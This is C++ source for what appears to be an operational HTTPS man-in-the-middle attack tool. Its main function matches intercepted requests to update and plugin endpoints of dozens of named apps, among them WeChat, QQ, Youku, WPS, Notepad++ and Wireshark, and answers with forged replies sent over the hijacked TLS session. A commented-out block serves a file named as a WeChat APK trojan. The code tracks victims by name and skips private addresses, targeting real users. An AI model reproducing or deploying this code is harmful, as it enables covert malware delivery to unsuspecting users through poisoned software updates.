
#include "SSLAttack.h"
#include "WeixinAndroid.h"
#include "WeixinPC.h"
#include "sslPublic.h"
#include "../HttpUtils.h"
#include "Toutiao.h"
#include "PluginServer.h"
#include "SSLProxy.h"
#include "QQmtt.h"
#include "ucmobile.h"
#include "..\\Public.h"
#include "../attacker.h"
#include "gtimg.h"
#include "Dingding.h"
#include "InformerClient.h"
#include "qqMusic.h"
#include "qukan.h"
#include "QQMusicAndroid.h"
#include "toutiaoPlugin.h"
#include "QQVideoSSL.h"
#include "alicdn.h"
#include "ShuqiPlugin.h"
#include "Youku.h"
#include "miaopaiUpdate.h"
#include "YoukuHotfix.h"
#include "WpsPlugin.h"
#include "QQAndroid.h"
#include "AttackSplitPacket.h"
#include "NotepadPP.h"
#include "ireaderPlugin.h"
#include "HuYaPlugin.h"
#include "YoukuPC.h"
#include "QQManager.h"
#include "HuaweiUpdate.h"
#include "Pinduoduo.h"
#include "BaiduPromotion.h"
#include "WechatPlugin.h"
#include "plugin360.h"
#include "lbspos.h"
#include "DidiAndroid.h"
#include "Kuaiya.h"
#include "WireSharkUpdate.h"
#include "QQ.h"
#include "windowsupdate.h"
#include "weixinAndroidJS.h"
#include "IqiyiPlugin.h"


int HttpsAttack::sendAttackPacket(char* recvBuffer, int resultlen, const char* szdm, LPSSLPROXYPARAM pstSSLProxyParam) {
	int iRet = 0;

	if (resultlen <= 0 || resultlen > SSL_MAX_BLOCK_SIZE)
	{
		printf("ssl attack data length:%u is larger than 0x4000\r\n", resultlen);
		return 0;
	}

	iRet = SSL_write(pstSSLProxyParam->SSLToClient, recvBuffer, resultlen);
	if (iRet != resultlen)
	{
		printf("SSL attack error:%d,description:%s,value:%d\n", SSL_get_error(pstSSLProxyParam->SSLToClient, iRet),
			SSL_state_string_long(pstSSLProxyParam->SSLToClient), iRet);
		return FALSE;
	}
	else {
		printf("SSL attacker SSL_write ok,dns:%s,packet:%s\n", szdm, recvBuffer);
	}

	iRet = Public::WriteLogFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, resultlen, "ssl attack response packet:");
	return TRUE;
}








int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url, const char* szDomainName, const char* httphdr,
	const char* httpdata, LPSSLPROXYPARAM pstSSLProxyParam)
{
	int iRet = 0;

	int resultlen = 0;

	if (pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr == 0x0100007f || strstr(pstSSLProxyParam->host, "127.0.0.1") ||
		(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr == gLocalIPAddr && gAttackMode != 3))
	{
		return TRUE;
	}

	if (pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr == gLocalIPAddr)
	{
		if (gAttackMode == 3)
		{

		}
		else {
			return TRUE;
		}
	}
	else {
		if (Public::isPrivateIPAddress(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr))
		{
			return TRUE;
		}
	}

	if (strstr(pstSSLProxyParam->host, gstrServerIP.c_str()) || strstr(pstSSLProxyParam->host, gstrLocalIP.c_str()) ||
		strstr(pstSSLProxyParam->host, MYOWNSITE_ATTACK_DOMAINNAME))
	{
		if (strstr(url, ".well-known/pki-validation/fileauth.txt"))
		{
			lstrcpyA((char*)recvBuffer, "/fileauth.txt HTTP/1.1\r\nHost: helloqq.com\r\n\r\n");
			iRet = PluginServer::PluginServerProc(pstSSLProxyParam, (char*)recvBuffer, iCounter);
		}
		else if (QQVideoSSL::isTencentPcUpgrade(url, pstSSLProxyParam->host))
		{
			string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
			lstrcpyA(pstSSLProxyParam->username, username.c_str());
			iRet = QQVideoSSL::replyTencentPcUpgrade(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		}
		else {
			iRet = PluginServer::PluginServerProc(pstSSLProxyParam, (char*)recvBuffer, iCounter);
			//printf("ssl recv pocket host:%s,url:%s\r\n", szDomainName, url);
		}

		return TRUE;
	}

	else if (strstr(szDomainName, "iface2.iqiyi.com") && strstr((char*)url, "/fusion/3.0/plugin?"))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
		lstrcpyA(pstSSLProxyParam->username, username.c_str());
		resultlen = IqiyiPlugin::replyIqiyiFw((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, (LPHTTPPROXYPARAM)pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	//ÍøÒ³°æ
	else if (QQVideoSSL::isTencentPcUpgrade(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());
		iRet = QQVideoSSL::replyTencentPcUpgrade(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		return TRUE;
	}
	else if (IReaderPlugin::isIReaderPlgin(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = IReaderPlugin::replyIReaderPlgin((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam->username);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (AliCdn::isAliCdnHead(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = AliCdn::makeHeadReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (AliCdn::isAliCdnRequest(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = AliCdn::makeRequestReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		//resultlen = AliCdn::makeRedirection((char*)recvBuffer, iCounter,NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		//resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (WPSPlugin::isWpsPlugin(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = WPSPlugin::replyWpsPcUpdate((char*)recvBuffer, NETWORK_BUFFER_SIZE, username);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (YoukuHotfix::isYoukuHotfix(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = YoukuHotfix::makeRequestReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}
	else if (Youku::isYoukuVod(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = Youku::replyYoukuVod((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	// 	else if (Youku::isYouku(url, szDomainName))
	// 	{
	// 		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr,szDomainName);
	// 
	// 		lstrcpyA(pstSSLProxyParam->username, username.c_str());
	// 
	// 		resultlen = Youku::replyYouku((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
	// 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
	// 		return TRUE;
	// 	}

	else if (ShuqiPlugin::isShuqi(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = ShuqiPlugin::replyShuqi((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		//resultlen = ShuqiPlugin::shuqiRedirection(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		//resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}
	else if (ShuqiPlugin::isShuqiHead(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = ShuqiPlugin::makeShuqiHeadReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}
	else if (ShuqiPlugin::isShuqiRequest(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = ShuqiPlugin::makeShuqiRequestReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		//resultlen = ShuqiPlugin::shuqiRedirection(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		//resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);

		return TRUE;
	}
	else if (WeixinPC::isWxPCUpdate(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());
		resultlen = WeixinPC::sendWxPCUpdate((char*)recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		if (resultlen > 0)
		{
			resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		}

		return TRUE;
	}

	else if (ToutiaoPlugin::isToutiaoPlugin(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());
		resultlen = ToutiaoPlugin::makeToutiaoPluginConfig((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam->username);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (QQAndroid::isQQPlugin(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());
		resultlen = QQAndroid::replyUpdate((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam->username);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (Qukan::isQukanHotfix(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = Qukan::replyQukanHotfix((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}


	else if (WeixinAndroid::isWxAndroidUpdateConfig(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = WeixinAndroid::makeWxAndroidUpdateConfig((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam->username);
		//resultlen = WeixinAndroid::makeNewWxAndroidUpdateConfig((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam->username);

		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}
	else if (WechatPlugin::iswechatPlugin(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = WechatPlugin::replyWechatPlugin(pstSSLProxyParam->username, (char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE);
		//resultlen = WeixinAndroid::makeNewWxAndroidUpdateConfig((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam->username);

		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (WeixinAndroid::isWxAndroidUpdateApkJs(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = WeixinAndroid::makeWxAndroidUpdateApkJs((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}
	else if (WeixinAndroid::isWxAndroidRequestWebApk(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = WeixinAndroid::sendWxAndroidUpdateApk(url, szDomainName, httphdr, pstSSLProxyParam);

		// 		 char * szHttpRespHdrAppFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
		// 		 string filename = Public::getUserUrl(username,WEIXIN_APK_TROJAN_FILENAME);
		// 		 resultlen = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespHdrAppFormat, 1);
		return TRUE;
	}
	else if (QQmtt::isQQmttUpdatePacket(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = QQmtt::makeQQmttUpdateResp(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		if (resultlen > 0)
		{
			resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}
	else if (UCMobile::isUCMobile(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = UCMobile::makeUpdateUrl(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		if (resultlen > 0)
		{
			resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}
	else if (QQigtimg::isQQigtimg(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = QQigtimg::replyQQigtimg(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		return TRUE;
	}
	else if (TouTiao::isToutiaoUpdate(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = TouTiao::replyToutiaoUpdate(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}
	else if (DingDing::isDingdingPluginUpdate(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = DingDing::sendPlugin(recvBuffer, iCounter, pstSSLProxyParam);

		return TRUE;
	}
	else if (DingDing::isDingdingUpdate(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = DingDing::makeReponse(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		if (resultlen > 0)
		{
			resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}
	else if (QQMusic::isQQMusic(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = QQMusic::sendPlugin(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		if (resultlen > 0)
		{
			resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}
	else if (NotepadPP::isNotepadPP(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = NotepadPP::replyNotepadPP(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (HuYaPlugin::isHuya(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = HuYaPlugin::makeHuyaPluginReply(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (YouKuPCPlugin::isYoukuPlugin(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = YouKuPCPlugin::replyYoukuPlugin(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		return TRUE;
	}

	else if (QQManager::isQQManager(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = QQManager::replayQQManager(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		if (resultlen > 0) {
			resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
		}

		return TRUE;
	}

	else if (TSZPlugin::is360Plugin(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		int retlen = TSZPlugin::reply360Plugin(recvBuffer, iCounter, pstSSLProxyParam);

		return TRUE;
	}

	else if (strstr(szDomainName, "360.cn") || strstr(szDomainName, "360.com"))
	{
		return TRUE;

	}

	else if (HuaweiUpdate::isHuaweiUpdate(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = HuaweiUpdate::replyHuaweiUpdate(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);

		return TRUE;
	}
	else if (Pinduoduo::isPinduoduo(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		resultlen = Pinduoduo::replyPinduoduo(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam);

		return TRUE;
	}


	else if (BaiduPromotion::isBaiduAd(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		int retlen = BaiduPromotion::replyBaiduAd(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, pstSSLProxyParam->username);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}

	else if (DidiAndroid::isDidi(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		int retlen = DidiAndroid::replyDidi(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}

	else if (KuaiyaUpdate::isKuaiya(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		int retlen = KuaiyaUpdate::replyKuaiyaUpdate(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}


	else if (WireSharkUpdate::isWireshark(url, szDomainName))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		int retlen = WireSharkUpdate::replyWireshark(recvBuffer, NETWORK_BUFFER_SIZE, pstSSLProxyParam->username);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}
	else if (QQBrowserPlugin::isQQBrowserPlugin(url, szDomainName, httphdr, httpdata))
	{
		string username = InformerClient::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);

		lstrcpyA(pstSSLProxyParam->username, username.c_str());

		int retlen = QQBrowserPlugin::sendQQBrowserPlugin(recvBuffer, NETWORK_BUFFER_SIZE, username);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szDomainName, pstSSLProxyParam);
		}
		return TRUE;
	}

	return FALSE;
}





int HttpsAttack::sslAttackProc(char* recvBuffer, int& iCounter, LPSSLPROXYPARAM pstSSLProxyParam) {
	int iRet = 0;
	char szout[1024];

	char* httpdata = 0;
	string httphdr = "";
	string url = "";
	string host = "";
	int port = 0;
	int type = 0;
	iRet = HttpUtils::parseHttpHdr(recvBuffer, iCounter, type, httphdr, &httpdata, url, host, port);
	if (iRet < 0)
	{
		if (pstSSLProxyParam->host[0] == 0)
		{
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
	else if (iRet == 0)
	{
		iRet = AttackSplitPacket::splitPacket(recvBuffer, iCounter, pstSSLProxyParam, httphdr, &httpdata, url, host, port);
		if (iRet <= 0)
		{
			Public::WriteLogFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, iCounter, "\r\nhttp splitPacket error:\r\n");
			return TRUE;
		}
		else {
			lstrcpyA(pstSSLProxyParam->host, host.c_str());
		}
	}
	else
	{
		lstrcpyA(pstSSLProxyParam->host, host.c_str());
	}

	if (*pstSSLProxyParam->host == 0)
	{
		return TRUE;
	}

#ifdef _DEBUG

#endif

	iRet = HttpsAttack::SslAttackPacket((char*)recvBuffer, iCounter, url.c_str(), host.c_str(), httphdr.c_str(),
		httpdata, pstSSLProxyParam);
	if (iRet)
	{
		return TRUE;
	}

	return FALSE;
}





